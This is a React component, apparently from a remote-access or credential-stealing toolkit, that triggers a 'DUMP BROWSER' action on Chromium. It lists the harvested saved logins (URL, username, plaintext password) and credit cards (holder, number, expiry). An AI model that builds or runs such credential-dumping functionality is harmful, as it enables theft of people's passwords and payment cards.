import React, {useState} from 'react';
import {Box, Button, Select, MenuItem, Table, TableBody, TableCell, TableHead, TableRow} from '@mui/material';
import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
import {useDispatch, useSelector} from "react-redux";

const BrowserCredentials = () => {
    const dispatch = useDispatch();
    const [showCreditCards, setShowCreditCards] = useState(false);
    const {credentials} = useSelector(state => state.credentialsManager);

    const handleShowCards = () => {
        setShowCreditCards(prevState => !prevState);
    };

    const handleDumpBrowser = () => {
        dispatch({type: DUMP_BROWSER});
    };

    return (
        <Box sx={{p: 2}}>
            <Box display="flex" gap={2} mb={2}>
                <Select
                    value={"chromium"}
                >
                    <MenuItem value="chromium">Chromium</MenuItem>
                </Select>
                <Button variant="contained" color="primary" onClick={handleDumpBrowser}>
                    DUMP BROWSER
                </Button>
                <Button variant="outlined" color="primary" onClick={handleShowCards}>
                    {showCreditCards ? 'Show Account Credentials' : 'Show Credit Cards'}
                </Button>
            </Box>
            <Box sx={{maxHeight: '50vh', overflowY: 'auto'}}> {/* Aquí es donde añadimos los estilos */}
                <Table>
                    <TableHead>
                        <TableRow>
                            {showCreditCards ? (
                                <>
                                    <TableCell>Name</TableCell>
                                    <TableCell>Card Number</TableCell>
                                    <TableCell>Expiration</TableCell>
                                </>
                            ) : (
                                <>
                                    <TableCell>Origin URL</TableCell>
                                    <TableCell>Username</TableCell>
                                    <TableCell>Password</TableCell>
                                </>
                            )}
                        </TableRow>
                    </TableHead>
                    <TableBody>
                        {showCreditCards ? (
                            (credentials?.creditCardCredentials || []).map((card, index) => (
                                <TableRow key={index}>
                                    <TableCell>{card.cardHolder}</TableCell>
                                    <TableCell>{card.creditCardNumber}</TableCell>
                                    <TableCell>{card.expirationMonth}/{card.expirationYear}</TableCell>
                                </TableRow>
                            ))
                        ) : (
                            (credentials?.accountCredentials || []).map((account, index) => (
                                <TableRow key={index}>
                                    <TableCell>{account.originUrl}</TableCell>
                                    <TableCell>{account.username}</TableCell>
                                    <TableCell>{account.password}</TableCell>
                                </TableRow>
                            ))
                        )}
                    </TableBody>
                </Table>
            </Box>
        </Box>
    );
};

export default BrowserCredentials;
